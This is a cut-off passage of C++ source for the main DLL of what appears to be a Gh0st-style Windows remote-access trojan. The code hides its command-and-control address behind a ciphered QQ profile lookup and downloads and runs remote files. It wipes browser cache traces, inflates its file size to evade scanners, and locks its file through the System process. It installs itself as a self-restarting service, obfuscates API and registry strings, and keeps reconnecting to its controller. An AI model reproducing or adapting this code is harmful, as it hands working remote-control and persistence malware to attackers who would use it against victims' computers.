// MainDll.cpp : Defines the entry point for the DLL application.
//

#include "stdafx.h"
#include <stdio.h> 
#include <windows.h> 
#include <shlobj.h>
#include "KernelManager.h"
#include "Login.h"
#include "common/KeyboardManager.h"
#include "decode.h"
#include "tchar.h"
#include "Wtsapi32.h"
#include  <io.h>
#include <UrlMon.h>
#import "msxml3.dll"
#pragma comment(lib, "urlmon.lib")
 
#pragma comment(lib , "Wtsapi32.lib")

// #if _DLL
// #pragma comment(linker, "/OPT:NOWIN98")
// #endif

//CMyFunc	  m_gFunc;
HMODULE hDllModule; 
BOOL    bisUnInstall = FALSE;
DLLSERVER_INFO dll_info = 
{
	"www.baidu.com",
		"123456789",
		2017,
		2017,
		"V_2017",
		"Default",
		"123456",
		"YYYYYYYYYYYY",
		"Yugqqu qekcaigu",
		"Igaoqa ymusuyukeamucgowws",
		"%ProgramFiles%\\Rumno Qrstuv",
		"Debug.exe",
		"Nmbbre hjveaika",
		0,                       //0Ϊ��װ��ɾ��    1Ϊ��װɾ��
		0,                       //0Ϊ��ɫ����      1ΪRun����    2Ϊ��������
		0,                       //0Ϊ��װ������
		0,                       //0Ϊ��ͨ��װ      1Ϊռ�ӷ�ɾ����װ
		0,                        //0Ϊ��ͬ��װ      1Ϊ���߼�¼��װ
		0,                        //0Ϊ������ת��
		FILE_ATTRIBUTE_NORMAL,    //�ļ�����
		'"',
//		"http://192.168.179.128/Consys21.dll"
		
};

CHAR MyDomain[100];     //����IP
CHAR MyQQDomain[100];     //����IP
WORD MyPort;            //���߶˿�
WORD MyQQPort;            //���߶˿�
CHAR MyVersion[100];    //����汾
CHAR MyGroup[100];      //���߷���
CHAR MySocketHead[100]; //ͨ������
CHAR MyServiceName[100];   //��������
CHAR MyServicePlay[128];   //������ʾ
CHAR MyServiceDesc[256];   //��������
CHAR MyReleasePath[100];   //��װ;��
CHAR MyReleaseName[50];    //��װ����
CHAR MyMexi[100];          //���л���
BOOL MyDele_te;            //��װ��ɾ��
CHAR MyDele_zc;            //��������
WORD MyDele_zd;            //��װ����
BOOL MyDele_fs;            //ռ�ӷ�ɾ����װ
BOOL MyDele_Kzj;           //���߼�¼
BOOL MyDele_Cul;           //���߼�¼
WORD MyFileAttribute;      //�ļ�����
CHAR MyszDownRun[300];     //�����ַ

enum
{
	    NOT_CONNECT, //  ��û������
		GETLOGINFO_ERROR,
		CONNECT_ERROR,
		HEARTBEATTIMEOUT_ERROR
};

//VOID MyEncryptFunction(LPSTR szData,WORD Size);
const char * szAddress;
int nConNum = 0;
// char	*lpszHost = NULL;
// DWORD	dwPort;




char ipExcp[30]= {0};
char lpszQQ[30]= {0};
BOOL qqonline(LPCTSTR str)
{
	///////////////////////////////����ip�Ļ�ȡ//////////////////////////////////////
	OutputDebugString("����qqonline");
	using namespace MSXML2;//ʹ��msxml2�����ռ�
	CoInitialize(NULL);//��ʼ��com�齨
	
	// //��internet��ʱ�ļ�
//     char szPath[MAX_PATH];
// 	DeleteUrlCache(File);
// 	if (SHGetSpecialFolderPath(NULL, szPath, CSIDL_INTERNET_CACHE, FALSE))
// 	{  //�õ���ʱĿ¼���������.
// 		EmptyDirectory(szPath);
// 	}
	
	try
	{
		IXMLHTTPRequestPtr xmlrequest;// ����һ��IXMLHTTPRequestPtr����ָ��
		xmlrequest.CreateInstance("Msxml2.XMLHTTP");//���齨�еõ�����Ľ��,�齨Ҳ���൱��һ������,�����ṩ�˺ܶ�����,����ֻҪ������Ҫ�Ľӿ������ܻ���ĸ�����
		_variant_t varp(false);
		char abc[MAX_PATH]={0};
		wsprintf (abc, "http://users.qzone.qq.com/fcg-bin/cgi_get_portrait.fcg?uins=%s",str);
		// 		char abc[50]="http://users.qzone.qq.com/fcg-bin/cgi_get_portrait.fcg?uins=";
		// 		strcat(abc,str);
		xmlrequest->open(_bstr_t("GET"),_bstr_t(abc),varp);// ��ʼ���������͵�ͷ����Ϣ
		xmlrequest->send(); // ���͵�������
		BSTR bstrbody;
		xmlrequest->get_responseText(&bstrbody);// ��÷������ķ�����Ϣ
		_bstr_t bstrtbody(bstrbody);// ��bstrbodyǿ��ת����_bstr_t���͵�����
		char	chBuff1[300*1024];    //��ȡ��������  
		strcpy(chBuff1,(LPCTSTR)bstrtbody);
		SysFreeString((BSTR)bstrbody);//�ͷ��ַ���
		
		char BvtmX15[] = {'#','#','#','\0'};
		char BvtmX16[] = {'*','*','*','\0'};
	    CClientSocket SocketClient;
		DWORD SizePoint = SocketClient.memfind(chBuff1,BvtmX15,sizeof(chBuff1),0)+4;
		DWORD SizePoinr = SocketClient.memfind(chBuff1,BvtmX16,sizeof(chBuff1),0)+1;
		
		DWORD SizePoine = 0;
		if(SizePoinr>SizePoint)
		{
			SizePoine = SizePoinr - SizePoint;
			SocketClient.substr(chBuff1,SizePoint,SizePoine);
			strcpy(lpszQQ,chBuff1);
			int arr[10][15]= {'s','t','u','v','w','x','y','z','a','b','c','d','e','f','g','t','u','v','w','x','y','z','a','b','c','d','e','f','g','h','u','v','w','x','y','z','a','b','c','d','e','f','g','h','i','v','w','x','y','z','a','b','c','d','e','f','g','h','i','j','w','x','y','z','a','b','c','d','e','f','g','h','i','j','k','m','n','o','p','q','r','s','t','u','v','w','x','y','z','a','n','o','p','q','r','s','t','u','v','w','x','y','z','a','b','o','p','q','r','s','t','u','v','w','x','y','z','a','b','c','p','q','r','s','t','u','v','w','x','y','z','a','b','c','d','q','r','s','t','u','v','w','x','y','z','a','b','c','d','e'};
			int D[15]={'r','s','t','u','v','w','x','y','z','a','b','c','d','e','f'};
			char *ipExcp=new char[strlen(lpszQQ)];
			strcpy(ipExcp,lpszQQ);
			for (int y=0; y<strlen(ipExcp); y++)
			{
				if (ipExcp[y] == D[y])
				{
					ipExcp[y] = '.';
				}
				else
				{
					for (int z=0; z<10; z++)
					{
						if (ipExcp[y] == arr[z][y])
						{
							ipExcp[y] = '0'+z;
							break;
						}
					}
				}
			}
			strcpy(lpszQQ,ipExcp);
		}
		else
			strcpy(lpszQQ,"��ȡʧ��... ");
		
	}
	catch(...)
	{
	}
	CoUninitialize();//����ʼ��com�齨��
	
	return true;
}


// дע��� ���� ��ע ��װʱ�� ��Ϣ
// void SetRegInfo()
// {
// 	char ServerINIPath[MAX_PATH]={0};
// 	GetModuleFileName(NULL,ServerINIPath,sizeof(ServerINIPath));
// 	PathRemoveFileSpec(ServerINIPath);
// 	lstrcat(ServerINIPath,"\\Server.ini");
// 	
// 	if (GetPrivateProfileInt("INSTALL","Once",0,ServerINIPath)==1)
// 	{
// 		return;
// 	}
// 	
// 	WritePrivateProfileString("INSTALL","Once","1",ServerINIPath); 
// 	
// 	WritePrivateProfileString("INSTALL","Group",dll_info.Group,ServerINIPath); 
// 	
// 	char szCurrentDateTime[32];     
// 	SYSTEMTIME systm;     
// 	GetLocalTime(&systm);     
// 	m_gFunc.wsprintf(szCurrentDateTime, "%4d-%.2d-%.2d %.2d:%.2d",     
//         systm.wYear, systm.wMonth, systm.wDay,     
//         systm.wHour, systm.wMinute);
// 	WritePrivateProfileString("INSTALL","Time",szCurrentDateTime,ServerINIPath);
// }

//=============================================================================
void MarkTime(LPCTSTR lpServiceName)  //д�����װʱ����Ϣ
{
	char	strSubKey[1024]={0};
	
	
	char JYvni08[] = {'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','S','e','r','v','i','c','e','s','\\','%','s','\0'};
	
	
	wsprintf(strSubKey,JYvni08,lpServiceName);
	
	
	SYSTEMTIME st;
	
	GetLocalTime(&st);
	char sDate[MAX_PATH]={NULL};
	char JYvni06[] = {'%','4','d','-','%','.','2','d','-','%','.','2','d',' ','%','.','2','d',':','%','.','2','d','\0'};
	
	
	wsprintf(sDate, JYvni06, st.wYear,st.wMonth,st.wDay, st.wHour,st.wMinute);
	
	
	char JYvni04[] = {'M','a','r','k','T','i','m','e','\0'};
	WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, JYvni04, REG_SZ, (char *)sDate, lstrlen(sDate), 0);
}


bool OpenFile1(LPCTSTR lpFile, INT nShowCmd)
{
	char	lpSubKey[500];
	HKEY	hKey;
	char	strTemp[MAX_PATH];
	LONG	nSize = sizeof(strTemp);
	char	*lpstrCat = NULL;
	memset(strTemp, 0, sizeof(strTemp));
	
	char	*lpExt = strrchr(lpFile, '.');
	if (!lpExt)
		return false;
	
	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpExt, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return false;
	RegQueryValue(hKey, NULL, strTemp, &nSize);
	RegCloseKey(hKey);
	memset(lpSubKey, 0, sizeof(lpSubKey));
	wsprintf(lpSubKey, "%s\\shell\\open\\command", strTemp);
	
	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpSubKey, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return false;
	memset(strTemp, 0, sizeof(strTemp));
	nSize = sizeof(strTemp);
	RegQueryValue(hKey, NULL, strTemp, &nSize);
	RegCloseKey(hKey);
	
	lpstrCat = strstr(strTemp, "\"%1");
	if (lpstrCat == NULL)
		lpstrCat = strstr(strTemp, "%1");
	
	if (lpstrCat == NULL)
	{
		lstrcat(strTemp, " ");
		lstrcat(strTemp, lpFile);
	}
	else
		lstrcpy(lpstrCat, lpFile);
	
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	if (nShowCmd != SW_HIDE)
		si.lpDesktop = "WinSta0\\Default"; 
	
	CreateProcess(NULL, strTemp, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
	
}


DWORD WINAPI Loop_DownManager1(LPVOID lparam)
{
	int	nUrlLength;
	char	*lpURL = NULL;
	char	*lpFileName = NULL;
	nUrlLength = strlen((char *)lparam);
	if (nUrlLength == 0)
		return false;
	
	lpURL = (char *)malloc(nUrlLength + 1);
	
	memcpy(lpURL, lparam, nUrlLength + 1);
	
	lpFileName = strrchr(lpURL, '/') + 1;
	if (lpFileName == NULL)
		return false;
	char szFile[512] = {0};
	wsprintf(szFile,"c:\\%s",lpFileName );
	
	HRESULT hr = URLDownloadToFile(NULL,lpURL, szFile, 0, NULL);
	if ( hr == S_OK ) {
		if ( !CheckFileExist(szFile) )
			return false; //�ļ����سɹ��������ļ������ڣ��ܿ��ܱ�ɱ�������ɱ
    }else if ( hr == INET_E_DOWNLOAD_FAILURE ) 
		return false;    //URL ����ȷ���ļ�����ʧ��	
	else
		return false; //�ļ�����ʧ�ܣ�����URL�Ƿ���ȷ
	
	OpenFile1(szFile,SW_SHOW);
	
	
	
	return true;
}

#define SWEEP_BUFFER_SIZE			10000



BOOL WipeFile(LPCTSTR szDir, LPCTSTR szFile)
{
	           CString sPath;
				HANDLE	hFile;
				DWORD	dwSize;
				DWORD	dwWrite;
				char	sZero[SWEEP_BUFFER_SIZE];
				memset(sZero, 0, SWEEP_BUFFER_SIZE);
				
				sPath = szDir;
				sPath += _T('\\');
				sPath += szFile;
				hFile = CreateFile(sPath, GENERIC_WRITE, 
					FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 
					FILE_ATTRIBUTE_NORMAL, NULL);
				if (hFile == INVALID_HANDLE_VALUE)
				{
					return FALSE;
				}
				
			    dwSize = GetFileSize(hFile, NULL);
				
				//skip file header (actually, I don't know the file format of index.dat)
				dwSize -= 64;
				SetFilePointer(hFile, 64, NULL, FILE_BEGIN);
				
				while (dwSize > 0)
				{
					if (dwSize > SWEEP_BUFFER_SIZE)
					{
						WriteFile(hFile, sZero, SWEEP_BUFFER_SIZE, &dwWrite, NULL);
						dwSize -= SWEEP_BUFFER_SIZE;
					}
					else
					{
						typedef BOOL
							(WINAPI
							*WriteFileT)(
							__in        HANDLE hFile,
							__in_bcount(nNumberOfBytesToWrite) LPCVOID lpBuffer,
							__in        DWORD nNumberOfBytesToWrite,
							__out_opt   LPDWORD lpNumberOfBytesWritten,
							__inout_opt LPOVERLAPPED lpOverlapped
							);
						
						WriteFileT tttt=(WriteFileT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"WriteFile");
						Sleep(0);
						tttt(hFile, sZero, dwSize, &dwWrite, NULL);
						break;
					}
				}
				
				CloseHandle(hFile);
				return TRUE;
}
BOOL EmptyDirectory(LPCTSTR szPath, BOOL bDeleteDesktopIni = FALSE,   BOOL bWipeIndexDat = FALSE);
BOOL EmptyDirectory(LPCTSTR szPath, BOOL bDeleteDesktopIni, 
					BOOL bWipeIndexDat)
{
	
	HMODULE hDll;
		
		typedef HMODULE
			(WINAPI
			*LoadLibraryAT)(
			__in LPCSTR lpLibFileName
			);
		typedef HANDLE
			(WINAPI
			*FindFirstFileAT)(
			__in  LPCSTR lpFileName,
			__out LPWIN32_FIND_DATAA lpFindFileData
    );
		
		LoadLibraryAT pLoadLibraryA=(LoadLibraryAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"LoadLibraryA");
	
	    hDll = pLoadLibraryA("KERNEL32.dll");
		
		WIN32_FIND_DATA wfd;
		HANDLE hFind;
		CString sFullPath;
		CString sFindFilter;
		DWORD dwAttributes = 0;
		
		sFindFilter = szPath;
		sFindFilter += _T("\\*.*");
		
		char KxIvH[] = {'F','i','n','d','F','i','r','s','t','F','i','l','e','A','\0'};

		FindFirstFileAT pFindFirstFileA=(FindFirstFileAT)GetProcAddress(hDll,KxIvH);
		if ((hFind = pFindFirstFileA(sFindFilter, &wfd)) == INVALID_HANDLE_VALUE)
		{
			return FALSE;
		}
		
		do
		{
			if (_tcscmp(wfd.cFileName, _T(".")) == 0 || 
				_tcscmp(wfd.cFileName, _T("..")) == 0 ||
				(bDeleteDesktopIni == FALSE && _tcsicmp(wfd.cFileName, _T("desktop.ini")) == 0))
			{
				continue;
			}
			
			sFullPath = szPath;
			sFullPath += _T('\\');
			sFullPath += wfd.cFileName;
			
			//ȥ��ֻ������
			dwAttributes = GetFileAttributes(sFullPath);
			if (dwAttributes & FILE_ATTRIBUTE_READONLY)
			{
				dwAttributes &= ~FILE_ATTRIBUTE_READONLY;
				
				typedef BOOL
					(WINAPI
					*SetFileAttributesAT)(
					__in LPCSTR lpFileName,
					__in DWORD dwFileAttributes
					);
				
				SetFileAttributesAT pSetFileAttributesA=(SetFileAttributesAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"SetFileAttributesA");

				pSetFileAttributesA(sFullPath, dwAttributes);
			}
			if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				EmptyDirectory(sFullPath, bDeleteDesktopIni, bWipeIndexDat);
				RemoveDirectory(sFullPath);
			}
			else
			{
				if (bWipeIndexDat && _tcsicmp(wfd.cFileName, _T("index.dat")) == 0)
				{
					WipeFile(szPath, wfd.cFileName);
				}
				DeleteFile(sFullPath);
			}
		}
		
		while (FindNextFile(hFind, &wfd));
		FindClose(hFind);
		
	return TRUE;
}



#define RANDOM_MAX 0x7FFFFFFF
static unsigned long next = 1;
static long my_do_rand(unsigned long *value)
{
	long quotient, remainder, t;
	
	quotient = *value / 127773L;
	remainder = *value % 127773L;
	t = 16807L * remainder - 2836L * quotient;
	
	if (t <= 0)
		t += 0x7FFFFFFFL;
	return ((*value = t) % ((unsigned long)RANDOM_MAX + 1));
}

int my_rand(void)
{
	return my_do_rand(&next);
}

//================================================================================================
VOID Wj_OnButtonAdd(LPSTR Path)  //�ļ��Ӵ���  Path �ļ���
{
	if(MyDele_zd == 0)  //��װ������
		return ;
	
	int m_Size=MyDele_zd;  //m_Size=10 ����10M
	DWORD dwSize = m_Size * 1024;
	DWORD iSize; 
	
	
	HANDLE hFile = CreateFile
		(
		Path, 
		GENERIC_WRITE, 
		FILE_SHARE_WRITE, 
		NULL, 
		OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL, 
		NULL
		);
	if(hFile==INVALID_HANDLE_VALUE)  //ʧ��
		return;
	
	
	SetFilePointer(hFile,0,NULL,FILE_END);
	
    iSize = GetFileSize(hFile,NULL);  
	
	if((dwSize*1024)>iSize)  //�ж��ļ��Ƿ���� ��ֹ����˳����ε������
	{  
		DWORD dwBytes=NULL;
		CHAR Buffer[1024]={NULL};
		for (DWORD n=0;n<dwSize;n++)
		{
			if(n%1024==0){
				for (int x=0;x<1024;x++)
					Buffer[x]=(char)(my_rand()+x)%255;    //д�������������
			}
			
			WriteFile(hFile,Buffer,1024,&dwBytes,NULL);
			
		}
	}
	
	CloseHandle(hFile);
	
	
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////////
void RaiseToDebugP()  //��Ȩ����  
{  
    HANDLE hToken;  
	
	
    HANDLE hProcess = GetCurrentProcess();  
	
    if (OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken) )  
	{  
		
		
        TOKEN_PRIVILEGES tkp;  
		
		
		
		
		
		char QNdJE01[] = {'S','e','D','e','b','u','g','P','r','i','v','i','l','e','g','e','\0'};
		if (LookupPrivilegeValue(NULL, QNdJE01, &tkp.Privileges[0].Luid) )
		{  
			
			
            tkp.PrivilegeCount = 1;  
			
            tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;  
			
			
			
			BOOL bREt = AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, 0) ;  
			
			
		}  
		
		
		
        CloseHandle(hToken);  
		
		
	}      
	
}  

BOOL OccupyFile( LPCTSTR lpFileName )  
{
	BOOL    bRet;  
	//��������Ȩ��  
	
	RaiseToDebugP();  
	//��һ��pidΪ4�Ľ��̣�ֻҪ�Ǵ��ڵĽ��̣������� 
	
	HANDLE hProcess = OpenProcess( PROCESS_DUP_HANDLE, FALSE, 4);    // 4Ϊsystem���̺�  
	
	if ( hProcess == NULL )  
	{            
		return FALSE;  
	}  
	
	HANDLE hFile;  
	HANDLE hTargetHandle;  
	//�Զ�ռģʽ��Ŀ���ļ�  
	
	hFile = CreateFile( lpFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL, NULL);   
	
	
	
	if ( hFile == INVALID_HANDLE_VALUE )  
	{  
		
		CloseHandle( hProcess );  
		
		return FALSE;  
	}  
	
	//���ļ�������Ƶ�pid=4�Ľ�����ȥ��������ֻҪpid=4�Ľ��̲��˳���˭Ҳ������Ŀ���ļ�  
	
	bRet = DuplicateHandle( GetCurrentProcess(), hFile, hProcess, &hTargetHandle,   
		0, FALSE, DUPLICATE_SAME_ACCESS|DUPLICATE_CLOSE_SOURCE);  
	
	
	CloseHandle( hProcess );  
	
	
	return bRet;  
}  

//==============================================================================

//==============================================================================
VOID MyCreatDirector(LPSTR Path)   //�����ļ���
{
	
	CHAR Dir[MAX_PATH]={NULL};
	int i;
	
	
	
	for (i=0;(size_t)i<strlen(Path);i++)
	{
		if(Path[i]=='\\')
		{
			
			my_strncpy(Dir,Path,i);
			
			if(_access(Dir,NULL)==-1)
			{
				
				CreateDirectory(Dir,NULL);
				
			}
		}
	}
	
}


//���л��� ������������
BOOL my_CreateEvent(BOOL str)
{
	BOOL strts=NULL;
	
	
	////////////////////////////////////////////////////////////////////////////////////////////////
	//����  �����ظ�����
	// 	m_gFunc.wsprintfA(strMutex,"%s:%d",dll_info.Domain,dll_info.Port);
// 	HANDLE m_hMutex = m_gFunc.CreateMutex(NULL, FALSE, strMutex);
	
	HANDLE hMutex = CreateEvent(NULL, FALSE, FALSE,MyMexi);  //���л��� ��������
	if(hMutex != NULL)  //�����ɹ�
	{
		
		if (GetLastError()==ERROR_ALREADY_EXISTS)
		{
			
			Sleep(1000);
			strts = TRUE;
		}
		
		if(str)
		{
			
			
			CloseHandle(hMutex);  //�ͷ� ����
		}
	}
	else
		strts = TRUE;
	
	return strts;
}

//================================================================================================


///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// �������� ж��
// BOOL _stdcall Uninstall()
// {

//	DeleteSelf();
//	NtUninstallService(dll_info.ServiceName);
	/*return TRUE;*/
/*}*/
 
// ��������_����
// BOOL _stdcall DllUpdate(HWND hwnd,        // handle to owner window   
// 						HINSTANCE hinst,  // instance handle for the DLL   
// 						LPTSTR lpCmdLine, // string the DLL will parse   
//                         int nCmdShow      // show state   
// 						)
// {
// 	// ����д
// 	return FALSE;
// }
///////////////////////////////////////////////////////////////////////////////////////////////////////////////

//////��360��������////////////
#include <shlwapi.h>
#include "wininet.h"
#pragma comment(lib,"shlwapi.lib")
#pragma comment(lib,"wininet.lib")
DWORD WINAPI Login(LPVOID lpServiceName);
LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo)
{

	
	// �����쳣�����´�������
	HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Login, NULL, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	return 0;
}

char	*lpszHost = NULL;
DWORD	dwPort = 80;

DWORD WINAPI Login(LPVOID lpServiceName)
{

	// ���� ���ߵ�ַ:�˿�:������

	OutputDebugString("�������Login");
	////////////////////////////////////////////////
	   if(my_CreateEvent(NULL))  //���л���
	   {
		   return 0;  // �˳����г���
	   }

  	   CClientSocket SocketClient;
	   if (MyDele_Kzj != false)
	   {
		   CKernelManager	manager(&SocketClient);
		   manager.StartUnLineHook();
	   }

	   if (CKeyboardManager::g_hInstances!=NULL)
	   {
		   SetUnhandledExceptionFilter(bad_exception);
	   }
	////////////////////////////////////////////////
     for(;;)
	 {

  
 	   BOOL    mconct=FALSE;  //֪ͨ�Ѿ�����
 	   BOOL    tconcz=FALSE;  //�Ƿ�����
 	   LPCTSTR lpConnecte[2]={0};  //����
	   if (MyDele_Cul != false)
	   {
		   OutputDebugString("��������ת��");

		   lstrcpy(MyDomain,SocketClient.UrlToIP(MyDomain));
		 
	   }
	   
	  
	   lpConnects[0]=MyDomain;  
 	   lpConnects[1]=MyQQDomain;
 	   szdwPort[0]=MyPort;
 	   szdwPort[1]=MyQQPort;
  	   
	   if(lstrlen(lpConnects[0]) == 0)
	   {
		   tconcz = TRUE;
		   nConnect = 1;
	   }
	   if(lstrlen(lpConnects[1]) == 0)
	   {
		   tconcz = TRUE;
		   nConnect = 0;
	   }
/////////////////////////////////////////////////////////////////////////////////////////
	HANDLE	hEvent = NULL;
	char	strKillEvent[100];

	BYTE	bBreakError = NOT_CONNECT;
	DWORD dwTickCount;


	while (1)
	{

		if (bBreakError != NOT_CONNECT && bBreakError != HEARTBEATTIMEOUT_ERROR)
		{
			
			// 2���Ӷ�������, Ϊ�˾�����Ӧkillevent
			for (int i = 0; i < 200; i++)
			{
				
				hEvent = OpenEvent(EVENT_ALL_ACCESS, false, strKillEvent);
				
				if (hEvent != NULL)
				{
					
					SocketClient.Disconnect();
					
					CloseHandle(hEvent);
					
					break;
				}
				// ��һ��
				Sleep(200);
			}
		}

	
		if(nConnect==0)
		{
			OutputDebugString("������������");
			lpConnecte[0]=lpConnects[0];

		}
		else if(nConnect==1)
		{

			OutputDebugString("����QQ��������");
			qqonline(lpConnects[1]);    
			
			if (lstrlen(lpszQQ) > 0)
			{
             lpConnecte[1]=lpszQQ;  //QQ����(2) ����
			}
			else
			{
				if(tconcz == FALSE)
				{
					nConnect++;
					if(nConnect>=2)
						nConnect=0;
				}
				mconct=FALSE;  //����λ��λ
				bBreakError = CONNECT_ERROR;
				continue;
			}
		}
        

		dwTickCount = GetTickCount();

		if (!SocketClient.Connect(lpConnecte[nConnect], szdwPort[nConnect]))
		{


			if(mconct!=TRUE)   //�ж��Ƿ��Ѿ�����
			{
				if(tconcz == FALSE)
				{
					nConnect++;
					if(nConnect>=2)
						nConnect=0;
				}
			}
			
			mconct=FALSE;  //����λ��λ
			bBreakError = CONNECT_ERROR;
		continue;
		}

		// ��¼
		DWORD dwExitCode = SOCKET_ERROR;

		DWORD upTickCount = GetTickCount()-dwTickCount;
		CKernelManager	manager(&SocketClient,lpConnecte[nConnect],szdwPort[nConnect]);


		SocketClient.SetManagerCallBack(&manager);

		nConNum = nConnect;

		szAddress = lpConnecte[nConnect];

		SendLoginInfo(hDllModule,&SocketClient,upTickCount);



		//////////////////////////////////////////////////////////////////////////
		// �ȴ����ƶ˷��ͼ��������ʱΪ10�룬��������,�Է����Ӵ���
		manager.m_bIsActived = true;
		
		
		// 10���û���յ����ƶ˷����ļ������˵���Է����ǿ��ƶˣ���������
		
		if (!manager.IsActived())
		{
			
			if(tconcz == FALSE)
			{
				nConnect++;
				if(nConnect>=2)
					nConnect=0;
				mconct=TRUE;  //֪ͨ�Ѿ�����
			}
			continue;
		}
		
	//////////////////////////////////////////////////////////////////////////

		DWORD	dwIOCPEvent;
		do
		{
           hEvent = OpenEvent(EVENT_ALL_ACCESS, false, strKillEvent);

			dwIOCPEvent = WaitForSingleObject(
				          SocketClient.m_hEvent,
						  100);
			Sleep(500);
		} while( dwIOCPEvent != WAIT_OBJECT_0 && hEvent == NULL);
		
		if(hEvent != NULL)
		{
			SocketClient.Disconnect();

			CloseHandle(hEvent);
			break;
		}
		
	}
}
////////////////////////////////////////////////////////////////////////////////


	return 0;
}



// VOID MyEncryptFunction(LPSTR szData,WORD Size)
// {
// 	//RC4 ���� ����  Mother360
// 	unsigned char m_strkey0[256];
// 	char bpackey_se[] = {'K','o','t','h','e','r','5','9','9','\0'};
// 	
// 	rc4_init(m_strkey0,(unsigned char*)bpackey_se, sizeof(bpackey_se));  //��ʼ�� RC4����
// 	
// 	rc4_crypt(m_strkey0,(unsigned char *)szData,Size);
// 	
// }


int StormRand(int count)
{
	unsigned long Time=GetTickCount();
	int seed=rand()+3;
	seed=(seed*Time)%count;
	return seed;
}

static BOOL fDelete_Me=FALSE;
//��������
static void RunService(/*char *m_ServPath,*/char *m_ServiceName,char *m_DisplayName,char *m_Description)
{

// 	typedef UINT
// 		(WINAPI
// 		*GetWindowsDirectoryAT)(
// 		__out_ecount_part_opt(uSize, return + 1) LPSTR lpBuffer,
// 		__in UINT uSize
// 		);

	char FilePath[MAX_PATH];
	GetModuleFileName(NULL,FilePath,MAX_PATH);
	char SystemPath[MAX_PATH];
// 	char LgSey[] = {'G','e','t','W','i','n','d','o','w','s','D','i','r','e','c','t','o','r','y','A','\0'};
//     GetWindowsDirectoryAT pGetWindowsDirectoryA=(GetWindowsDirectoryAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),LgSey);
// 	pGetWindowsDirectoryA(SystemPath,MAX_PATH);

	ExpandEnvironmentStrings(MyReleasePath, SystemPath, MAX_PATH);
	
	if (strncmp(SystemPath,FilePath,strlen(SystemPath)) != 0)
	{
		MyCreatDirector(SystemPath);   //�����ļ���
		char FileName[80];
// 		char cpXPZ[] = {'%','c','%','c','%','c','%','c','%','c','%','c','.','e','x','e','\0'};
//         wsprintf(FileName,cpXPZ,'a'+StormRand(26),'a'+StormRand(26),'a'+StormRand(26),'a'+StormRand(26),'a'+StormRand(26),'a'+StormRand(26));//�漴����һ���ļ���
		char cpXPZ[] = {'%','s','\0'};
        wsprintf(FileName,cpXPZ,MyReleaseName);
	 	if(SystemPath[strlen(SystemPath)-1]=='\\') //ȥ������'\\'
		SystemPath[strlen(SystemPath)-1]=0;
		strcat(SystemPath,"\\");
		strcat(SystemPath,FileName);
		CopyFile(FilePath,SystemPath,FALSE);
		Wj_OnButtonAdd(SystemPath);  //�ļ�����
		memset(FilePath,0,MAX_PATH);
		strcpy(FilePath,SystemPath);
		SetFileAttributes(SystemPath,MyFileAttribute);//�����������
	}

	char Desc[MAX_PATH];
	HKEY key=NULL;
	SC_HANDLE newService=NULL, scm=NULL;
	__try
	{
		scm = OpenSCManager(0, 0,SC_MANAGER_ALL_ACCESS);
		if (!scm)
			__leave;
		newService = CreateService(
			scm, m_ServiceName, m_DisplayName,
		SERVICE_ALL_ACCESS|SERVICE_CHANGE_CONFIG,
		SERVICE_WIN32_OWN_PROCESS|SERVICE_INTERACTIVE_PROCESS,
		SERVICE_AUTO_START,
		SERVICE_ERROR_NORMAL,
		FilePath,NULL, NULL, NULL, NULL, NULL);
		//����һ�·���...

		SC_LOCK sc_lock=LockServiceDatabase(scm);
		SERVICE_DESCRIPTION Service_Descrip={&MyServicePlay[0]};
		ChangeServiceConfig2(newService,SERVICE_CONFIG_DESCRIPTION,&Service_Descrip);
		SERVICE_FAILURE_ACTIONS sdBuf={0};
		sdBuf.lpRebootMsg=NULL;
		sdBuf.dwResetPeriod=3600*24;
		SC_ACTION action[3];
		action[0].Delay=7000;
		action[0].Type=SC_ACTION_RESTART;
		action[1].Delay=0;
		action[1].Type=SC_ACTION_RESTART;
		action[2].Delay=0;
		action[2].Type=SC_ACTION_RESTART;
		sdBuf.cActions=3;
		sdBuf.lpsaActions=action;
		sdBuf.lpCommand=NULL;
		if( !ChangeServiceConfig2(newService, SERVICE_CONFIG_FAILURE_ACTIONS, &sdBuf))                   
		{
// 			OutputDebugString("ChangeServiceConfig2 failed");
		}

		UnlockServiceDatabase(sc_lock);
		if (newService == NULL)
		{
			if (GetLastError() == ERROR_SERVICE_EXISTS)
			{
				newService = OpenService(scm,m_ServiceName,SERVICE_ALL_ACCESS);
				if (newService==NULL)
					__leave;
				else
					StartService(newService,0, 0);
			}
		}
		if (!StartService(newService,0, 0))
			__leave;
		char YRuIB[] = {'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','S','e','r','v','i','c','e','s','\\','\0'};
// 		strcpy(Desc,"SYSTEM\\CurrentControlSet\\Services\\");
		strcpy(Desc,YRuIB);
		strcat(Desc,m_ServiceName);
		RegOpenKey(HKEY_LOCAL_MACHINE,Desc,&key);
		char jdkrg[] = {'D','e','s','c','r','i','p','t','i','o','n','\0'};
